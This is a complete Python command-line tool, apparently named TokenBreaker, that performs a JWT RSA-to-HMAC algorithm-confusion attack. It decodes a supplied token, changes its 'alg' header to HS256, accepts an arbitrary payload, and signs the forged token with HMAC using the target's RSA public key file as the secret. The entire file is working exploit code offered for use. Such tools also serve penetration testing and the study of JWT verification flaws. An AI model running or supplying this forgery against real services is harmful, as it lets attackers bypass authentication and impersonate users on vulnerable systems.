#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function

import argparse
import base64
import re
import hmac
import hashlib
from sys import exit

def info(txt): return '[\033[1m\033[36m*\033[0m] \033[34m'+str(txt)+'\033[0m'
def bad(txt): return '[\033[1m\033[31m-\033[0m] \033[31m'+str(txt)+'\033[0m'
def warning(txt): return'[\033[1m\033[33m!\033[0m] \033[33m'+str(txt)+'\033[0m'
def good(txt): return '[\033[1m\033[32m+\033[0m] \033[32m'+str(txt)+'\033[0m'
def cool_input(text):
    try:
        _input = raw_input('[\033[1m\033[35m<\033[0m] \033[35m{}:\033[0m \033[3m'.format(text))
        print('\033[0m', end='')
        return _input
    except KeyboardInterrupt:
        print('\b\b  \033[0m')
        print(bad('Exitting via Keyboard Interruption.'))
        exit(0)
    except EOFError:
        print('\033[0m')
        print(bad('Terminating!'))
        exit(0)

def banner():
    logo = '\033[1m ___  ___   _     _         _  _ __  __   _   ___\n| _ \\/ __| /_\\   | |_ ___  | || |  \\/  | /_\\ / __|\n|   /\\__ \\/ _ \\  |  _/ _ \\ | __ | |\\/| |/ _ \\ (__\n|_|_\\|___/_/ \\_\\  \\__\\___/ |_||_|_|  |_/_/ \\_\\___|\n\033[0m'
    print(logo)

def pad_check(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += b'='* (4 - missing_padding)
    return data

def print_header(token,pubkey):
    header = base64.b64decode(pad_check(token.split('.')[0]))
    payload = base64.b64decode(pad_check(token.split('.')[1]))
    print(info("Decoded Header value: {}".format(header)))
    print(info("Decode Payload value: {}".format(payload)))
    header = re.sub('"alg":".{5}"', '"alg":"HS256"', header)
    print(info("New header value with HMAC: {}".format(header)))
    modify_response = cool_input("Modify Header? [y/N]")
    if modify_response.lower() == 'y':
        header = cool_input("Enter your header with 'alg' field set to 'HS256'")
        print(info("Header set to: {}".format(header)))
    payload = cool_input("Enter Your Payload value")
    base64header = base64.b64encode(header).rstrip('=')
    base64payload = base64.b64encode(payload).rstrip('=')
    try:
        f=open(pubkey,'r')
    except IOError:
        print(bad("Unable to open file!"))
        exit(1)
    headerandpayload = base64header + '.' + base64payload
    finaljwt = headerandpayload+'.'+base64.b64encode(hmac.new(f.read(), msg=headerandpayload, digestmod=hashlib.sha256).digest()).replace('/','_').replace('+','-').strip('=')
    print(good("Successfully Encoded Token: {}".format(finaljwt)))

def main():
    parser = argparse.ArgumentParser(description='TokenBreaker: 2.RSAtoHMAC',
            epilog='Example Usage: \npython RsatoHMAC.py -t [JWTtoken] -p [PathtoPublickeyfile]\n')
    requiredparser=parser.add_argument_group('required arguments')
    requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
    requiredparser.add_argument('-p','--pubkey',help="Path to Public key File",required=True)
    args = parser.parse_args()
    banner()
    print_header(args.token,args.pubkey)

if __name__=='__main__':
    main()
